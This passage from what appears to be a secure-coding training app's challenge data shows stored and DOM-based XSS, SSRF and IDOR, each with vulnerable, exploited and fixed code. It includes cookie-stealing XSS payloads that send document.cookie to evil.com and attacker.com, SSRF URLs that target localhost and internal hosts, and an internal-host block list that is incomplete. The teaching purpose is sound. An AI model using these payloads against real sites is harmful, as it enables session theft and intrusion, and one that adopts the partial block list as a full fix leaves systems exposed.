        exploitedCode: `app.post('/api/comments', async (req, res) => {
    // 🔴 EXPLOITED: Attacker posts comment with script
    const { postId, content } = req.body;
    // content = "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
    await db.comments.insert({ postId, content, userId: req.user.id });
    // ✓ Malicious script stored in database!
});

app.get('/post/:id', async (req, res) => {
    const post = await db.posts.findById(req.params.id);
    const comments = await db.comments.find({ postId: req.params.id });
    
    let html = \`<h1>\${post.title}</h1>\`;
    comments.forEach(c => {
        html += \`<div class="comment"><script>fetch('https://evil.com/steal?c='+document.cookie)</script></div>\`;
        // ✓ Every visitor executes attacker's script!
    });
    res.send(html);
});`,
        secureCode: `const escapeHtml = require('escape-html');

app.post('/api/comments', async (req, res) => {
    const { postId, content } = req.body;
    await db.comments.insert({ postId, content, userId: req.user.id });
    res.json({ success: true });
});

app.get('/post/:id', async (req, res) => {
    const post = await db.posts.findById(req.params.id);
    const comments = await db.comments.find({ postId: req.params.id });
    
    let html = \`<h1>\${escapeHtml(post.title)}</h1>\`;
    comments.forEach(c => {
        html += \`<div class="comment">\${escapeHtml(c.content)}</div>\`;
    });
    res.send(html);
});`,
        secureExploitedCode: `const escapeHtml = require('escape-html');

app.get('/post/:id', async (req, res) => {
    // ✅ SAFE: Same malicious comment from database
    const comments = await db.comments.find({ postId: req.params.id });
    // comment.content = "<script>steal()</script>"
    
    let html = \`<h1>\${escapeHtml(post.title)}</h1>\`;
    comments.forEach(c => {
        html += \`<div class="comment">\${escapeHtml(c.content)}</div>\`;
        // Outputs: &lt;script&gt;steal()&lt;/script&gt;
        // ✅ Displayed as text, not executed!
    });
    res.send(html);
    // ✅ Users see "<script>steal()</script>" as plain text
});`,
        vulnerableLines: [13],
        explanation: 'Stored XSS is more dangerous than reflected XSS because the attack persists. Every user who views the page executes the malicious script. Always sanitize output, especially user-generated content from the database.',
        hints: [
            'Where is the user input being displayed?',
            'Is data from the database always safe?',
            'How many users could be affected?'
        ],
        vulnerabilityType: 'Cross-Site Scripting (XSS)',
        severity: 'high',
        cwe: 'CWE-79',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Persistent Script Injection',
            description: 'Malicious script stored in database affects all viewers',
            payload: `Comment: <script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>`,
            result: `✓ Script stored in database
✓ Every visitor's browser executes it
✓ Mass cookie/session theft
✓ Can spread like a worm`
        }
    },
    {
        id: 'xss-dom',
        title: 'DOM-based XSS',
        description: 'Client-side JavaScript processes URL fragment unsafely.',
        language: 'javascript',
        category: 'xss',
        difficulty: 'hard',
        vulnerableCode: `// Client-side JavaScript
const searchTerm = window.location.hash.substring(1);
document.getElementById('search-term').innerHTML = 'Searching for: ' + searchTerm;

// URL: https://site.com/search#laptop
// Displays: "Searching for: laptop"`,
        exploitedCode: `// 🔴 EXPLOITED: Attacker sends link with malicious hash
// URL: https://site.com/search#<img src=x onerror=alert(document.cookie)>

const searchTerm = window.location.hash.substring(1);
// searchTerm = "<img src=x onerror=alert(document.cookie)>"

document.getElementById('search-term').innerHTML = 'Searching for: ' + searchTerm;
// DOM now contains: <img src=x onerror=alert(document.cookie)>
// ✓ Browser tries to load image, fails, executes onerror!
// ✓ Never hits the server - pure client-side attack!`,
        secureCode: `const searchTerm = window.location.hash.substring(1);
document.getElementById('search-term').textContent = 'Searching for: ' + searchTerm;
// textContent treats input as text, not HTML`,
        secureExploitedCode: `// ✅ SAFE: Same malicious URL
// URL: https://site.com/search#<img src=x onerror=steal()>

const searchTerm = window.location.hash.substring(1);
// searchTerm = "<img src=x onerror=steal()>"

document.getElementById('search-term').textContent = 'Searching for: ' + searchTerm;
// ✅ textContent escapes HTML automatically
// ✅ Displays literal text: "<img src=x onerror=steal()>"
// ✅ No script execution!`,
        vulnerableLines: [3],
        explanation: 'DOM-based XSS happens entirely in the browser. The malicious payload in the URL fragment (#) never reaches the server, making it invisible to server-side security. Use textContent instead of innerHTML when displaying user input.',
        hints: [
            'What is the difference between innerHTML and textContent?',
            'Does the URL fragment get sent to the server?',
            'What sources can attackers control in the browser?'
        ],
        vulnerabilityType: 'Cross-Site Scripting (XSS)',
        severity: 'high',
        cwe: 'CWE-79',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Client-Side Only Attack',
            description: 'Attacker crafts URL that executes script without server involvement',
            payload: `https://trusted-site.com/search#<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`,
            result: `✓ Victim clicks link to trusted site
✓ URL fragment processed by JavaScript
✓ Script executes in victim's browser
✓ Server logs show nothing suspicious`
        }
    },
    {
        id: 'ssrf-basic',
        title: 'Basic SSRF via Image URL',
        description: 'Image proxy fetches user-provided URLs without validation.',
        language: 'python',
        category: 'ssrf',
        difficulty: 'easy',
        vulnerableCode: `@app.route('/proxy-image')
def proxy_image():
    url = request.args.get('url')
    response = requests.get(url)
    return Response(response.content, mimetype='image/png')`,
        exploitedCode: `@app.route('/proxy-image')
def proxy_image():
    # 🔴 EXPLOITED: Attacker requests internal resource
    url = request.args.get('url')
    # url = "http://localhost:8080/admin/delete-all"
    
    response = requests.get(url)
    # ✓ Server makes request to internal admin panel!
    # ✓ Can access services behind firewall
    return Response(response.content, mimetype='image/png')`,
        secureCode: `from urllib.parse import urlparse

BLOCKED_HOSTS = ['localhost', '127.0.0.1', '169.254.169.254', '0.0.0.0']

@app.route('/proxy-image')
def proxy_image():
    url = request.args.get('url')
    parsed = urlparse(url)
    
    if parsed.hostname in BLOCKED_HOSTS or parsed.hostname.startswith('10.') or parsed.hostname.startswith('192.168.'):
        return 'Blocked', 403
    
    response = requests.get(url, timeout=5)
    return Response(response.content, mimetype='image/png')`,
        secureExploitedCode: `from urllib.parse import urlparse

BLOCKED_HOSTS = ['localhost', '127.0.0.1', '169.254.169.254']

@app.route('/proxy-image')
def proxy_image():
    # ✅ SAFE: Same attack "http://localhost:8080/admin"
    url = request.args.get('url')
    parsed = urlparse(url)
    # parsed.hostname = "localhost"
    
    if parsed.hostname in BLOCKED_HOSTS:
        return 'Blocked', 403
        # ✅ Returns 403 - attack blocked!
    
    response = requests.get(url, timeout=5)
    return Response(response.content, mimetype='image/png')`,
        vulnerableLines: [4],
        explanation: 'The server fetches any URL the user provides. Attackers can use this to access internal services, scan internal networks, or retrieve cloud metadata credentials.',
        hints: [
            'What URLs should be forbidden?',
            'Can internal services be accessed?',
            'What about cloud metadata endpoints?'
        ],
        vulnerabilityType: 'Server-Side Request Forgery',
        severity: 'high',
        cwe: 'CWE-918',
        owasp: 'A10:2021 - SSRF',
        exploitExample: {
            title: 'Internal Service Access',
            description: 'Attacker accesses internal services through the proxy',
            payload: `/proxy-image?url=http://localhost:8080/admin
/proxy-image?url=http://192.168.1.1/router-config`,
            result: `✓ Server fetches internal URLs
✓ Attacker sees admin panel content
✓ Can access any internal service`
        }
    },
    {
        id: 'idor-direct',
        title: 'Direct Object Reference in API',
        description: 'API endpoint exposes internal object IDs without access control.',
        language: 'javascript',
        category: 'idor',
        difficulty: 'easy',
        vulnerableCode: `app.get('/api/invoice/:id', async (req, res) => {
    const invoice = await Invoice.findById(req.params.id);
    res.json(invoice);
});`,
        exploitedCode: `// 🔴 EXPLOITED: Attacker changes invoice ID
app.get('/api/invoice/:id', async (req, res) => {
    const invoice = await Invoice.findById(req.params.id);
    // req.params.id = "INV-0001" (belongs to another company!)
    
    res.json(invoice);
    // ✓ Returns competitor's invoice with pricing!
    // { customerId: "ACME Corp", items: [...], total: "$50,000" }
});`,
        secureCode: `app.get('/api/invoice/:id', authMiddleware, async (req, res) => {
    const invoice = await Invoice.findById(req.params.id);
    
    if (!invoice || invoice.companyId !== req.user.companyId) {
        return res.status(404).json({ error: 'Invoice not found' });
    }
    
    res.json(invoice);
});`,
        secureExploitedCode: `// ✅ SAFE: Same attack - trying to access INV-0001
app.get('/api/invoice/:id', authMiddleware, async (req, res) => {
    const invoice = await Invoice.findById(req.params.id);
    // invoice.companyId = "ACME" (different company)
    // req.user.companyId = "Attacker Inc"
    
    if (!invoice || invoice.companyId !== req.user.companyId) {
        return res.status(404).json({ error: 'Invoice not found' });
        // ✅ Returns 404 - can't access other company's data!
    }
    
    res.json(invoice);  // Never reached
});`,
        vulnerableLines: [2, 3],
        explanation: 'The API returns any invoice by ID without checking if the requesting user should have access. Attackers can enumerate invoice IDs to access confidential business data.',
        hints: [
            'Who should be able to see this invoice?',
            'What if someone guesses another ID?',
            'Is there any ownership check?'
        ],
        vulnerabilityType: 'Insecure Direct Object Reference',
        severity: 'high',
        cwe: 'CWE-639',
        owasp: 'A01:2021 - Broken Access Control',
        exploitExample: {
            title: 'Invoice Enumeration',
            description: 'Attacker iterates through invoice IDs to steal business data',
            payload: `GET /api/invoice/INV-0001
GET /api/invoice/INV-0002
GET /api/invoice/INV-0003`,
            result: `✓ Access to all invoices in system
✓ Competitor pricing exposed
✓ Customer lists leaked`
        }
    }
];

export const categories = [
    { id: 'sqli', name: 'SQL Injection', icon: 'Database' },
    { id: 'xss', name: 'XSS', icon: 'Code' },
    { id: 'ssrf', name: 'SSRF', icon: 'Globe' },
    { id: 'idor', name: 'IDOR', icon: 'Key' },
    { id: 'auth', name: 'Authentication', icon: 'Lock' },
    { id: 'crypto', name: 'Cryptography', icon: 'Shield' },
    { id: 'injection', name: 'Other Injection', icon: 'Terminal' },
];

export const difficulties = [
    { id: 'easy', name: 'Easy', color: 'green' },
    { id: 'medium', name: 'Medium', color: 'yellow' },
    { id: 'hard', name: 'Hard', color: 'red' },
];
